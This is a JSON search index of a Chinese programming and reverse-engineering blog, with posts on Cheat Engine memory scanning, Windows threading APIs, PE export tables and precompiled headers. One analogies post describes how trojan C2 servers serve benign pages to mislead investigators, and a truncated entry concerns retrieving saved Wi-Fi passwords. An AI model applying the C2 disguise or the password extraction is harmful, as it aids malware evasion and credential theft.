[{"title":"CE教程（Tutorial1-9）","path":"/posts/cbbf245e.html","content":"环境准备 下载好CE，本文用的是CE7.5。管理员启动CE，点击Help-Cheat Engine Tutorial启动Tutorial进程。 Step1 在CE的进程列表中Open到Tutorial后开始通关练习。 Step2 搜100，准确值，4字节，New Scan，搜出很多个结果，点击Hit me，减少到98，继续搜98，准确值，4字节，Next Scan。 Step3 减少，具体减少多少 Step4 浮点数搜索 Step5 找到access/write这个数值的地址 Step6 找到访问这个数值的代码，修改为什么都不做 Step7 这个数值被指针A指向，改变指针的操作就是新申请一块内存，把原来的值拷过去，用指针B指向。所以需要找到不变的基址。 Step8 小结 CE搜索原理 内存搜索，New Scan是第一次搜，得到一些结果，Next Scan是在上一次搜索的基础上继续搜。但是进程中可能很多值和我们要搜的值一样，所以要利用“变化”来反复搜，最终确认我们想要的那个值的地址。比如健康血量是100，第一次搜100，搜出来有50个都是100，点击Hit me，让血量减少到99，Next Scan搜99，重复以上操作，直至确认出唯一的地址结果。 一般涉及数值的是4字节，用字节去搜 操作参考 https://www.cnblogs.com/LyShark/p/10799926.html 博客 https://www.cnblogs.com/ibinary https://www.cnblogs.com/lyshark"},{"title":"在Windows窗口程序中新建一个用于输出调试信息的控制台","path":"/posts/e1c55744.html","content":"前言 在Windows应用程序开发中，入口函数变为了WinMain，之前写控制台程序时的那个cmd窗口没有了，就不方便打印一些调试信息。此时，可以使用AllocConsole()创建一个cmd窗口，然后就能愉快地使用printf或std::cout进行调试信息的打印输出。 相关API 1234567891011FILE* m_stream = nullptr; // 文件指针，用于重定向标准输出AllocConsole(); // 分配一个新的控制台窗口freopen_s(&amp;m_stream, &quot;CONOUT$&quot;, &quot;w&quot;, stdout); // 将标准输出重定向到新的控制台//freopen(&quot;CONOUT$&quot;, &quot;w&quot;, stdout); // 不安全版本的 freopen//使用printf(&quot;Debug console initialized. &quot;); // 使用标准输出流打印调试信息std::cout &lt;&lt; &quot;Debug console initialized.&quot; &lt;&lt; std::endl; // 使用标准输出流打印调试信息fclose(m_stream); // 关闭文件流FreeConsole(); // 释放控制台 RAII版 为了更方便地管理控制台的创建和销毁，封装成RAII类 DebugConsole.h1234567891011121314151617181920212223242526272829303132#pragma once#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#define ENABLE_DEBUG_CONSOLE 1 // 宏定义，用于控制是否启用调试控制台class DebugConsole&#123;public: DebugConsole() &#123;#if ENABLE_DEBUG_CONSOLE AllocConsole(); // 分配一个新的控制台窗口 freopen_s(&amp;m_stream, &quot;CONOUT$&quot;, &quot;w&quot;, stdout); // 将标准输出重定向到新的控制台 //freopen(&quot;CONOUT$&quot;, &quot;w&quot;, stdout); // 不安全版本的 freopen //printf(&quot;Debug console initialized. &quot;); // 使用标准输出流打印调试信息 //std::cout &lt;&lt; &quot;Debug console initialized.&quot; &lt;&lt; std::endl; // 使用标准输出流打印调试信息#endif &#125; ~DebugConsole() &#123;#if ENABLE_DEBUG_CONSOLE fclose(m_stream); // 关闭文件流 FreeConsole(); // 释放控制台#endif &#125;private: FILE* m_stream = nullptr; // 文件指针，用于重定向标准输出&#125;; 例 main.cpp123456789101112131415161718#include &lt;Windows.h&gt;#include &quot;DebugConsole.h&quot;int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) &#123;#if ENABLE_DEBUG_CONSOLE DebugConsole debugConsole;#endif //使用 printf(&quot;This is a debug message. &quot;); //std::cout &lt;&lt; &quot;This is another debug message.&quot; &lt;&lt; std::endl; // 其他代码... MessageBox(NULL, &quot;Hello, Windows!&quot;, &quot;WinMain&quot;, MB_OK); return 0;&#125;","tags":["编程小技巧"],"categories":["系统编程","Windows API编程"]},{"title":"线程同步与线程互斥","path":"/posts/df83ab2b.html","content":"前言 wiki中Windows API里线程篇中对各种相关对象写的笔记不够简练。这篇新文章，就是对Windows临界区、互斥体、事件和信号量对象的总结和梳理，同时会更结构化地讲解线程同步和线程互斥。 Wait Functions 等待函数(Wait Functions)有两个，WaitForSingleObject和WaitForMultipleObjects。WaitForSingleObject用于等待单个内核对象，WaitForMultipleObjects用于等待多个内核对象。 对于不同的内核对象，微软都统一抽象成了两种状态： signaled state：有信号/授信状态/已通知状态/触发态 non signaled state：无信号/无状态/未通知状态/非触发态 WaitForSingleObject 等待一个内核对象变成已通知状态（in the signaled state）或等的时间等够了就结束等待。 1234DWORD WaitForSingleObject( [in] HANDLE hHandle, // handle to object 句柄 [in] DWORD dwMilliseconds // time-out interval 等待超时时间（毫秒）); 返回值 函数调用成功： WAIT_OBJECT_0，表示成功“等待”到设置的对象 WAIT_TIMEOUT，等待超时 WAIT_ABANDONED，当等待的对象是Mutex类型时，如果持有该Mutex对象的线程已经结束，但是没有在结束前释放该Mutex，此时该Mutex已经处于废弃状态，其行为是未知的，不建议再使用该Mutex 函数调用失败： 返回值为WAIT_FAILED，调GetLaseError得到具体错误码 WaitForMultipleObjects 等待多个内核对象or任一内核对象变成已通知状态（in the signaled state）或等的时间等够了就结束等待。 12345DWORD WaitForMultipleObjects( [in] DWORD nCount, // number of handles in array 内核对象的数量 [in] const HANDLE *lpHandles, // object-handle array 内核对象的句柄数组 [in] BOOL bWaitAll, // wait option 等待模式，等待所有内核对象还是等待任一对象 [in] DWORD dwMilliseconds // time-out interval 等待超时时间（毫秒） 参数bWaitAll TRUE：等待所有对象的状态发生变更 FALSE：等待任一对象的状态发生变更 和上面等待一个内核对象的一样，只不过表示WAIT_OBJECT_0和WAIT_ABANDONED含义时会多加上nCount-1，nCount-1用于表示内核对象数组中的哪一个。 返回值在参数bWaitAll设置为 FALSE 的情况下（即等待任一对象的状态发生变更）函数调用成功：WAIT_TIMEOUT，等待超时WAIT_OBJECT_0 ～ (WAIT_OBJECT_0 + nCount– 1)**，表示成功“等待”到设置的对象通过nCount– 1可以知道是等待对象数组中哪个对象状态发生了改变举个例子，假设现在等待三个对象A1、A2、A3，它们在数组lpHandles中的下标依次是0、1、2，某次WaitForMultipleObjects返回值是 Wait_OBJECT_0 + 1，则表示对象A2有信号，导致WaitForMultipleObjects调用成功返回。123456789101112131415161718192021222324HANDLE waitHandles[3];waitHandles[0] = hA1Handle;waitHandles[1] = hA2Handle;waitHandles[2] = hA3Handle;DWORD dwResult = WaitForMultipleObjects(3, waitHandles, FALSE, 3000);switch(dwResult)&#123; case WAIT_OBJECT_0 + 0: //A1 有信号 break; case WAIT_OBJECT_0 + 1: //A2 有信号 break; case WAIT_OBJECT_0 + 2: //A3 有信号 break; default: //出错或超时 break;&#125;WAIT_ABANDONED_0 ～ (WAIT_ABANDONED_0 + nCount– 1)，当等待的对象是Mutex类型时，如果持有该Mutex对象的线程已经结束，但是没有在结束前释放该Mutex，此时该Mutex已经处于废弃状态，其行为是未知的，不建议再使用该Mutex。通过nCount - 1可以知道是等待对象数组中哪个对象始终没有被其他线程释放使用权函数调用失败：返回值为WAIT_FAILED，调GetLaseError得到具体错误码 等待的含义 对于不同的内核对象，这个等待的含义是不一样的，要关注的是： 等待的含义 等待到了之后，是否会修改到等待内核对象的状态 可以被等待的对象 等待对象成功的含义 是否会修改到等待内核对象的状态 线程(Thread) 等待线程结束 不会，线程结束后状态自然变化 进程(Process) 等待进程结束 不会，进程结束后状态自然变化 事件(Event) 等待Event有信号 如果是自动重置事件，等待函数返回时，状态将自动重置为无信号如果是手动重置事件，状态不会自动改变，需要手动重置（手动调用ResetEvent） 互斥体(Mutex) 等待持有Mutex的线程释放该Mutex，等待成功后拥有该Mutex 会，调用线程获取Mutex后其状态会变为无信号 信号量(Semaphore) 等待该 Semaphore 对象有信号 会，调用WaitForSingleObject会使信号量的计数减一 临界区（Critical Section）对象 创建全局变量：CRITICAL_SECTION cs; 初始化全局变量：InitializeCriticalSection(&amp;cs); 实现临界区 123EnterCriticalSection(&amp;cs); //进入临界区//使用临界资源LeaveCriticalSection(&amp;cs); //离开临界区 相关函数12345678910void InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection);// 初始化临界区对象资源 void EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection); // 进入临界区 //...使用临界区资源void LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection); // 离开临界区 void DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection); // 删除临界区对象资源 使用临界区锁的注意事项 将临界区只包裹住实际需要保护的临界资源操作。如果包裹了其他无用代码会导致程序效率低下。 几个临界资源，就用几个临界区锁。 互斥体（Mutex）对象 创建一个Mutex对象12345HANDLE CreateMutexA(\t[in, optional] LPSECURITY_ATTRIBUTES lpMutexAttributes, // SD 安全属性，包含安全描述符\t[in] BOOL bInitialOwner, // initial owner 创建者是否是该Mutex对象的拥有者\t[in, optional] LPCSTR lpName // mutex object name 互斥体的名字); 参数bInitialOwner，创建该Mutex对象的线程是否立即拥有该Mutex对象 TRUE：拥有 FALSE：不拥有 互斥体对象有拥有者的概念： 互斥体对象状态为可用（signaled state）时，线程能够通过WaitForSingleObject等待请求获得该Mutex对象，获得后会将互斥体对象状态改为不可用（non signaled state） 当一个互斥体对象被线程拥有后，其他线程调用WaitForSingleObject等待请求会被阻塞 直至拥有互斥体对象的线程调用ReleaseMutex释放掉互斥体对象，让互斥体对象可用（signaled state） 或拥有者线程在退出时没有释放其持有的Mutex对象，这时WaitForSingleObject调用返回WAIT_ABANDONED，表示这个Mutex处于废弃状态（abandoned），其行为是未知的，不建议再使用该Mutex 释放Mutex对象让其可用123BOOL ReleaseMutex(\tHANDLE hMutex // handle to mutex); 线程互斥 当多个线程需要访问同一个临界资源时，例如同时都要写一个全局变量，就需要进行互斥控制。 临界资源：一次只允许一个线程使用的资源 临界区：访问临界资源的那部分代码，称为临界区代码 体会这里的思想：原本是要控制临界资源，现在转为控制访问临界资源的代码部分（即临界区代码）。 将需要控制的资源转换为程序员可控的代码部分，即临界资源 -&gt; 临界区代码。 互斥控制的目的是在某一时刻只允许一个线程执行临界区代码。互斥控制的办法之一是通过“令牌”来解决，只有拿到“令牌”的线程才能进临界区，在没有归还“令牌”之前，其他线程不能进临界区。上述的临界区锁和互斥体锁都能实现这种控制。 线程A在临界区中，CPU时间片耗尽，线程B获得CPU时间片，但进不去临界区。调度程序会将线程B放入等待队列中（睡眠），线程B不会继续消耗CPU时间。此时操作系统会将CPU时间片分配给其他可运行的线程（包括线程A）。线程A重新获得CPU时间片，离开临界区并释放锁，操作系统会唤醒在等待队列中的线程B（？如果还有一个不相关的线程C，是B先，还是B和C随机。mark，这块需要阅读操作系统调度的源码，后面再细写）。 线程A出临界区释放令牌后，进到就绪队列，线程A和线程B获得CPU时间片的机会是均等的，也就是说，线程A出临界区后，有可能再次进到临界区，而不保证线程A出临界区后，就轮到线程B进临界区。 如果线程A出临界区后，不需要再次进入临界区；当线程B被阻塞时，让这个线程B循环等待请求锁，避免睡眠后来一次唤醒（睡眠-&gt;唤醒有开销），又称“自旋”。不过这方式也不靠谱，永远不能假设线程的调度策略是按预想的来执行。 事件（Event）对象 CreateEvent 使用CreateEvent创建事件对象（Event Object）。事件对象有两种状态： signaled state：有信号/授信状态 non signaled state：无信号/无状态 123456HANDLE CreateEventA( // 返回事件对象的句柄 [in, optional] LPSECURITY_ATTRIBUTES lpEventAttributes, // SD 安全属性，包含安全描述符 [in] BOOL bManualReset, // reset type 重置类型 [in] BOOL bInitialState, // initial state 初始化状态 [in, optional] LPCSTR lpName // event object name 事件对象名); lpEventAttributes：SD，安全属性，包含安全描述符，一般设置为NULL bManualReset：重置类型，指示事件对象是手动重置（manual-reset event object）还是自动重置（auto-reset event object） TRUE：手动重置。需要手动调用RestEvent函数将Event对象重置为无信号状态 FALSE：自动重置。Event对象受信后会自动重置为无信号状态 bInitialState：Event事件对象被创建后的初始状态是有信号还是无信号状态 TRUE：有信号，signaled FALSE：无信号，non signaled lpName：Event对象的名称 SetEvent SetEvent将无信号的Event对象设置（Set）为授信状态 1BOOL SetEvent( HANDLE hEvent // handle to event); ReSetEvent ReSetEvent将有信号的Event对象重置（ReSet）为无信号状态 1BOOL ResetEvent( HANDLE hEvent // handle to event); Event对象的状态可以通过手动设置或自动重置来通知另一个线程，这样就能进行“通信”，就能用于线程的同步控制 信号量（Semaphore）对象 相比于事件，信号量有可用资源计数器的概念。笔者在使用时就是将信号量理解为“通知”，只不过多了计数器的概念。 使用CreateSemaphoreA创建信号量对象 123456HANDLE CreateSemaphoreA( [in, optional] LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, // SD [in] LONG lInitialCount, // initial count 初始可用资源数 [in] LONG lMaximumCount, // maximum count 最大可用资源数 [in, optional] LPCSTR lpName // object name); 参数 lInitialCount 指定初始可用资源数量，假设初始资源数量为 2，如果有 5 个线程正在调用 WaitForSingleObject 函数等待该信号量，则有 2 个线程会被唤醒，每调用一次 WaitForSingleObject 获得 Semaphore 对象，该对象的资源计数会减少一个。 参数 lMaximumCount 最大资源数量上限，这个值必须大于0 线程调用WaitForSingleObject等待信号量可用，等待到后信号量的资源计数会减1.如果使用 ReleaseSemaphore （释放信号量）来增加资源计数 12345BOOL ReleaseSemaphore( [in] HANDLE hSemaphore, // handle to semaphore [in] LONG lReleaseCount, // count increment amount 需要增加的资源个数 [out, optional] LPLONG lpPreviousCount // previous count); 参数 hSemaphore 是需要操作的信号量句柄； 参数 lReleaseCount，需要增加的资源数量； 参数 lpPreviousCount 是一个 long 型（32 位系统上 4 个字节）的指针，函数执行成功后，返回上一次资源的数量，如果用不到该参数，可以设置为 NULL。 使用ReleaseSemaphore增加资源数量，最大不能超过lMaximumCount，这个值必须设置大于 0 线程同步 线程A出临界区后，很可能再次进入临界区。线程互斥只能保证同一时刻对临界资源的访问只有一个线程，不能保证线程的先后顺序，它是无序的。如果对线程的先后顺序有要求，那就是做同步控制。同步=互斥+有序。 复杂线程控制问题 既需要做同步控制，又需要做互斥控制。例子可参考这道题单生产者-多Buffer-多消费者 参考链接 3.6 Windows 线程资源同步对象","tags":["线程同步","线程互斥"],"categories":["系统编程","Windows API编程"]},{"title":"【求助文】一些暂时没找到答案的计算机问题","path":"/posts/3d7b63a8.html","content":"问题描述模板 问题简要描述 博客中与这块知识相关的文章链接（可选） 详细细节 尝试思考的过程 思维发散和扩展（可选） 目录索引表： 问题名称 该问题解决的迫切程度 PE导出表地址表优化问题【问题求助中，未解决】 1 模块间对齐值【问题求助中，未解决】 1 CMP指令与有符号数【问题求助中，未解决】 0 【问题求助中，未解决】 【问题已于xxx时间解决】 该问题解决的迫切程度： 0：解决强迫症，这个问题解决了可能也没啥用 1：比0高，研究价值可能也不是很高 PE导出表地址表优化问题 问题简要描述 写dll时存在函数别名，在这种情况下。为什么地址表中还会将函数别名的函数地址又存一遍，而不是让序号表里多个序号指向地址表的同一项，这样就可以减少地址表中重复的函数地址存储，节省空间。 博客中与这块知识相关的文章链接（可选） 导出表 详细细节 测试用的dll文件源码如下，用VS 32位编译 ArithmeticOperations.h123456#pragma onceint __stdcall Plus(int x, int y);int __stdcall Sub(int x, int y);int __stdcall Mul(int x, int y);int __stdcall Div(int x, int y);Source.def123456789;LIBRARY;EXPORTS\t;\tPlus @1;\t;Add = Plus ; Add is an alias for Plus;\t;Add2 = Plus ; Add2 also is an alias for Plus;\tSub @2 NONAME;\tMul @3;\tDiv @4加减乘除，对应序号1，2，3，4同时还有两个别名：分别是Add，Add2作为Plus函数的别名 ArithmeticOperations.cpp123456789101112131415161718#include &quot;ArithmeticOperations.h&quot;int __stdcall Plus(int x, int y)&#123;\treturn x + y;&#125;int __stdcall Sub(int x, int y)&#123;\treturn x - y;&#125;int __stdcall Mul(int x, int y)&#123;\treturn x * y;&#125;int __stdcall Div(int x, int y)&#123;\treturn x / y;&#125; 基于这下面这两点认知： 通过导出函数名字在导出函数名称表查完后，为什么还需要一个序号表？因为：一个导出函数可能有多个名字，所以还需要一个序号表，用于用于连接名称表和地址表。 导出函数地址表的个数是NumberOfFunctions个，计算方法是：导出函数中序号最大的-导出函数中序号最小的+1。比如写dll时.def序号最小是11，最大是15，那么一共有15-11+1=5个。如果只用到11，12，13，15；14没用到，地址表中14那项函数地址补0 以为查看dll中三张子表的情况如下图所示：认为Add，Add2，plus名称在序号表都指向同一个序号值（名称表有多少个，序号表就有多少个）。然后多个序号都指向地址表的同一项。也就是说，在地址表中函数地址0x00011235只存一次。 但实际情况是： 算上别名2次，加上Plus本名，它将Plus函数函数地址在地址表存了3遍！ 上述实验得到的结论是： 地址表个数无法&gt;名字表。因为即使多了别名，编译器生成的函数地址表也会再存一遍别名的函数的函数地址。它不会让名称表中多个值指向地址表中同一项，来达到优化存储的目的。 NumberOfFunctions=导出函数中序号最大的-导出函数中序号最小的+1，还要进行补充： 导出序号不连续导致了空位，然后又有别名，别名会先占空位的位置，空位没了，地址表继续增加项数 和之前的认知不符： 地址表个数可能&gt;名字表，因为可以多个名字对应同一个函数地址 NumberOfFunctions=导出函数中序号最大的-导出函数中序号最小的+1。 尝试思考的过程 以函数名查找导出函数方式是先去名称表匹配，找到数组的索引值，Add和Plus得到的数组索引值没法一样，所以还需要序号表做中转。序号表用于连接函数名和地址表，所以序号表个数和名称表个数一样，这个能接受。那序号表[0]，序号表[1]，序号表[4]都存个0呗，就都指向地址表[0]，这样就节省了地址表的存储空间了，但用VS或用VC编译的dll并没有这样。 思维发散和扩展（可选） 如果想对函数地址表存的地址去重，只留下一个；再修改序号表里的关系。第一步就是道算法题了：删除无序顺序表中重复的元素，只留下一个 编译器在编译时加上去重并不难，不清楚为啥没有实现 地址表去重的工作没继续做，目前觉得没啥研究价值，可以用于导出表压缩？但压缩的这点空间好像不够看的。先记下，未来有机会再看吧 模块间对齐值 问题简要描述 在进程空间中，模块与模块之间的对齐值为什么是64k 博客中与这块知识相关的文章链接（可选） wiki-PE-一些概念文章 观测细节 用OD拖进32位的notepad，找了两个相邻的模块 模块名 基址 大小 基址+大小 IMM32 75610000h 26000h 75636000h gdi32ful 75640000h 模块IMM32末尾地址75636000h和下一个模块gdi32ful基址75640000h，之间，填充了4000h。发现模块一和模块二之间确实是按64k对齐，即10000h。换个看法，模块IMM32和模块gdi32ful的基址也是10000h的整数倍。 尝试思考的过程 但不清楚为什么对齐值是64k，感觉像个魔数（magic number）。1个物理小页4kb，16个物理页，用段式和页式管理的知识也不清楚怎么凑出64k这个数。 gpt4回答：“在进程空间中，各模块间通常采用较大的对齐值，如64KB，以避免模块间数据的冲突和便于内存管理。这种大尺寸对齐有助于操作系统更高效地分配和管理内存空间，尽管这会在一定程度上增加内存的碎片。”意思就是选个大点的尺寸呗，但笔者想要个更“好”的回答。 CMP指令与有符号数 问题简要描述 CMP指令执行后，如果通过SF和OF两个符号位来知道有符号数比较的结构 博客中与这块知识相关的文章链接（可选） 标志寄存器和JCC指令 详细细节 CMP（比较)指令执行从目的操作数中减去源操作数的隐含减法操作，并且不修改任何操作数： 1CMP destination,source 如果比较的是两个有符号数,则符号标志位、零标志位和溢出标志位表示的两个操作数之间的关系如下表所示: CMP结果 标志位 备注 目的操作数＜源操作数 SF≠OF 目的操作数＞源操作数 SF=OF 目的操作数＝源操作数 ZF=1 一样大，结果=0，ZF=1 尝试思考的过程 目的操作数＜源操作数（不够减） 目的操作数＞源操作数（够减） 正-正&lt;=&gt;正+负 比如2-3，结果为负，SF=1。正+负不会有溢出，OF=0 比如3-2，结果为正，SF=0。没有溢出，OF=0 正-负&lt;=&gt;正+正 负-正&lt;=&gt;正+负 负-负&lt;=&gt;正+负 SF表示有符号整型的最高有效位。(0指示结果为正，反之则为负) OF用于反映有符号数加减运算所得结果是否溢出 正＋正=正，但如果结果是负数，则说明有溢出 负＋负=负，但如果结果是正数，则说明有溢出 正＋负，永远都不会有溢出 没分析出来","tags":["问题求助"],"categories":["计算机知识","问题求助"]},{"title":"那些有着异曲同工之处的计算机知识","path":"/posts/32e8f536.html","content":"记录学习过程中那些有着异曲同工之处的A知识和B知识，不定期更新补充。 SQL注入 和 数据区执行代码 搭建过SQL注入靶场环境就会知道，如果服务器端的脚本语言，比如PHP代码没有对用户通过URL提交的参数作适当校验，这么参数中的数据就有可能被错误地当作代码执行（“数据被当成代码执行”），从而导致“SQL注入”。 与此类似的是，在进程空间中的数据区执行代码（数据和代码本质都是一堆数）。解决数据区执行代码的措施之一，就是让让数据区没有可执行权限。类似到防止SQL注入上，就是使用参数化查询。参数化查询让用户输入的数据仅作为数据进行处理，而不会被解释或执行为代码。 switch语句地址表 和 PE文件导出序号调整 当编译器处理Switch语句决定采用地址表优化时，那么不管case判定值的大小是多少，编译器都会进行下标调整，以便可以从数组的第一个下标（即0）开始访问。比如case101-case104，编译器会先将case值减去101，用调整后的下标再去地址表查表。 类似地，在使用Windows API的GetProcAddress函数通过序号查询导出函数的地址，调用过程也涉及下标的调整。具体情况是，传入的序号会首先减去一个基数（Base），用得到的结果作为新的下标去函数地址表中查表，得到导出函数地址。 上述两种情况都进行了下标调整，原因是一样的：无论是switch的地址表还是PE文件的函数地址表，数组的起始序号都是从0开始。因此，进行适当的下标调整是必要的，以确保无论输入序号如何，数组访问都能正确地从0开始。 伪装与分流技术（fallback技术） 服务器的行为会根据接收的数据包类型进行调整，比如分流操作。这在X-rays中称为fallback技术。 Trojan-server节点的分流策略 Trojan服务端节点根据接收的数据包做分流： 如果是有效的trojan数据包，进行代理功能 如果不是有效的trojan数据包，服务器将断开连接或重定向到一个伪装的网页（防止GFW主动探测。如果GFW主动连接，将看到的是一个正常的网页） Vmess + Nginx 在Vmess服务端节点前置一个Nginx服务器来实现类似的分流和伪造功能。Nginx作为反向代理，根据入站的数据流选择转发至vmess服务或伪造。 C2服务器 在木马与其C2（命令与控制）服务器通信的场景，服务器同样可以采用这种分流技术。 如果是木马端回连C2服务器，则进行后续的指令和数据交换 如果不是，服务端返回一个普通网页或其他非恶意内容，来误导探测者 字节对齐 因为硬件设计的原因，通常情况下，如果数据的起始地址是硬件读写操作基本单位的整倍数，那么硬件在读写这些数据时效率更高，就不需要二次读写分散数据。 字节对齐本质上就是数据的起始地址是某个数的整数倍，这个概念可以用别的说法来表达： 数据的起始地址能整除对齐值 这个数据块的总大小能整除对齐值 字节对齐在计算机中广泛可见其身影： 结构体对齐规则：以便减少内存访问次数。 硬盘数据扇区对齐：机械硬盘读写数据的最小单元，扇区，是512字节（0x200），所以在早期操作系统版本中PE文件的文件对齐值为200h。现在随着存储容量上升价格下降，文件对齐值可以是1000h，以空间换时间，免去加载时候的拉伸过程。 PE文件的内存对齐：内存页以4kb为最小单位，所以PE文件的SectionAlignment通常设为1000h。 进程空间中模块与模块之间的对齐：各模块起始地址是64k的整数倍，即10000h。但笔者不清楚为什么模块与模块之间的对齐值是64k，可能就是设了一个较大尺寸。 绑定机制（binding） 绑定：函数调用处与函数地址关联起来的过程 在C++编程中： 非虚函数，早绑定，函数地址在程序编译时就确定了 虚函数，晚绑定，函数地址在函数调用时才能确定 早绑定，地址确定的，函数调用效率高；晚绑定，间接调用，有灵活性，但相对而言增加了调用开销。 在PE文件的导入表这块： 提前绑定：在PE文件加载前，提前把要外部函数地址固化到IAT表表项中 运行时绑定：PE文件加载时，由加载器逐一将IAT表中的条目替换为实际的函数地址 提前绑定，如果遇到dll未能按预期想法那样加载，还是需要重新替换IAT表。这也类似于指令流水线会提前预测，预测对了，执行效率高，预测失败就回退。","tags":["知识共通性"],"categories":["计算机知识","杂谈"]},{"title":"C/C++ 预编译头","path":"/posts/82675b27.html","content":"预编译头解决了什么问题 需要先简单地介绍下一个项目编译成exe的过程。 预处理(Preprocessing)：主要用于处理#开头的代码行，头文件展开，条件编译展开，删除注释。生成以.i和.ii结尾的结果文件。 编译(Compilation)：使用预处理的输出结果作为输入，生成文本格式的平台相关的汇编代码(assembly code)。文件以.s结尾。 汇编(Assemble)：将上一步的汇编代码转换成二进制的机器码，称为object code。产生的文件叫做目标文件，是二进制格式，文件以.o或.obj结尾。 链接(Linking)：链接过程将多个目标文以及所需的库文件(.so等)链接成最终的可执行文件(executable file)。 平时开发时.h文件的后缀是约定俗成的，后缀名其实无所谓，改成其他的搜可以。在cpp文件中#include .h文件的作用就是将这个头文件里的内容“粘贴”一份到cpp文件中的这行#include语句，头文件展开是在预处理过程做的。然后到了第二步编译(Compilation)，C/C++ 编译器只编译源文件（.c/.cc/.cxx/.cpp），C/C++ 是以文件为编译单位（C++ 20中才有其他高级语言编译单元是整个Module下所有源码的概念），每个源文件（.c/.cc/.cxx/.cpp）都单独编译成为一个.o/.obj文件，最后由链接器链object文件成为可执行文件。 由编译原理和C/C++ 以每个源文件独立编译的特点可以发现一个问题，假设有A.h和A.cpp，B.h和B.cpp和C.h和C.cpp。假如A.cpp，B.cpp，C.cpp都用到了同一些头文件，比如都用到了stdio.h，都用到了Windows.h。那么stdio.h和Windows.h里的内容在编译时都要在编译单元A，B，C都要进行“文件展开”（都解析，复制拷贝一次）。 如果在一个非常大的项目中，一个头文件被N个源文件同时引用，这样的开销会很大。 预编译头文件 预编译头文件（Precompiled Header，PCH），简称预编译头。就是将那些常用的头文件（比如写windows程序，几乎都要包含Windows.h头文件）放在预编译头中，让编译器指定这个预编译头。当第一次编译时，编译器会将这个预编译头编译生成一个.pch后缀的二进制文件；之后，如果预编译头里的内容没有进行修改，则直接使用预先生成的这个.pch二进制文件，将这个文件载入内存（所以使用预编译头会提高项目的内存占用），从而加快编译速度。 如果预编译头的内容进行了修改，需要重新编译生成.pch二进制文件。因此，在预编译头中应该放一些不常改动的内容，如 标准库STL头文件 第三方库头文件 宏定义 预定义的类型 一些我们自己写的但基本不会更改的头文件等等。 使用预编译头 编译器开启使用预编译头 在项目-C/C++-预编译头，启用或关闭使用预编译头 启用预编译头的话，创建（/Yc）和使用（/Yu）都要分别设置一次，都填上自己的预编译头文件名。 文件名字可以任意 可以看到输出文件是$(IntDir)$(TargetName).pch，就是编译后会生成后缀名为.pch的二进制文件 编写预编译头 pch.h123#pragma once#include &lt;Windows.h&gt; 因为C/C++ 是对（.c/.cc/.cxx/.cpp）进行编译，不对头文件进行编译，所以需要一个对应的.cpp文件，这个.cpp文件是为了编译，所以这个.cpp里的内容只要有包含这个头文件的语句即可 pch.cpp1#include &quot;pch.h&quot; 注意：在预编译头文件之后再重复包含该文件内已包含的头文件并不会有问题，所以不必特意去掉那些重复的包含语句。 包含预编译头 需要在所有的源文件中包含预编译头文件，并且该文件必须是第一个包含的，否则会编译失败。 原因：由于编译器假定预编译头中包含过的头文件会在所有cpp中使用，因此它在编译你的 cpp 的时候，就会将预编译头中已经编译完的部分加载到内存中。如果它突然发现你的 cpp 居然没有包含预编译头，它就会很郁闷，因为它不知道该如何将已编译完的部分从内存中请出去，整个编译过程就会失败。因此，如果你使用了预编译头技术，就必须在所有的 cpp 中包含预编译头。 如果觉得每次在cpp文件中手动添加这句太麻烦，VS提供了强制在所有源文件中包含指定头文件的选项。在项目属性-C/C++-高级，强制包含文件选项中加上这个预编译头。 例 未开强制包含文件 pch.h123#pragma once#include &lt;Windows.h&gt; pch.cpp1#include &quot;pch.h&quot; main.cpp123456#include &quot;pch.h&quot;int main()&#123;\treturn 0;&#125; 可以看到生成的.pch文件 Tips： 使用VC创建一个“控制台的Hello World!”项目，本文中说的预编译头指的就是编译器自动生成的StdAfx.h和StdAfx.cpp。 使用VS2019创建一个静态链接库或动态链接库项目，本文中说的预编译头指的就是编译器自动生成的pch.h和pch.cpp。 参考链接 参考链接🔗 备注 如何使用预编译头以及预编译头的原理.rst 用g++生成pch文件，即使删除预编译头文件，使用pch文件，编译也能通过 C++预编译头文件 参考了这篇文章编译的过程 使用预编译头提高编译速度 写得挺好的，可以看下操作 【C++进阶之路第一卷】预编译头加快编译速度 写得挺好的，可以看下操作 visual studio预编译头 很简短的文字 VS2019自定义预编译头文件 写得可以 关于预编译头文件的一些知识 为什么源文件需要包含预编译头文件","tags":["C/C++","预编译头"],"categories":["编程语言","C/C++"]},{"title":"C++ ScopeGuard","path":"/posts/1897be85.html","content":"123 web.archive.org/web/20121009071337/http://www.drdobbs.com/cpp/… (page 1), web.archive.org/web/20190317153736/http://www.drdobbs.com/cpp/… (page 2), web.archive.org/web/20190317164052/http://www.drdobbs.com/cpp/… (page 3)。 github星比较多的：scope_guard 国人改造后:ScopeGuard ScopeGuard原理介绍与实现（上） ScopeGuard原理介绍与实现（下） C11（及现代C风格）和快速迭代式开发https://mindhacks.cn/2012/08/27/modern-cpp-practices/ 没收藏到的：What is ScopeGuard in C++? https://www.google.com/search?q=Generic%3A+Change+the+Way+You+Write+Exception-Safe+Code+—+Forever&amp;oq=Generic%3A+Change+the+Way+You+Write+Exception-Safe+Code+—+Forever&amp;gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQRRg60gEHMzI4ajBqMagCALACAA&amp;sourceid=chrome&amp;ie=UTF-8#ip=1 https://dlang.org/articles/exception-safe.html https://stackoverflow.com/questions/19683039/exception-safety-patterns-for-reliably-rolling-back-object-state https://bajamircea.github.io/coding/cpp/2018/04/12/scope-guard.html The difference is that ScopeGuard focuses only on the cleanup part — you do the resource acquisition, and ScopeGuard takes care of relinquishing the resource. true，false，C++内置的布尔类型 explicit，显示转换，隐式就不行了 [*] - 通常用于普通信息或状态更新，表示进程的一般消息。 示例: [*] Connecting to the database... [+] - 通常表示成功、确认或其他正面的动作。 示例: [+] Connection established successfully. [-] - 常用于表示失败、拒绝或其他负面的动作。 示例: [-] Failed to connect to the database. [!] - 用于警告、错误或需要特别注意的事项。 示例: [!] Warning: Configuration file is missing.","tags":["C/C++","ScopeGuard"],"categories":["编程语言","C/C++"]},{"title":"通过Native Wifi API获取Windows系统已保存的Wifi密码","path":"/posts/117ff6d9.html","content":"前言 通过网络和Internet设置查看 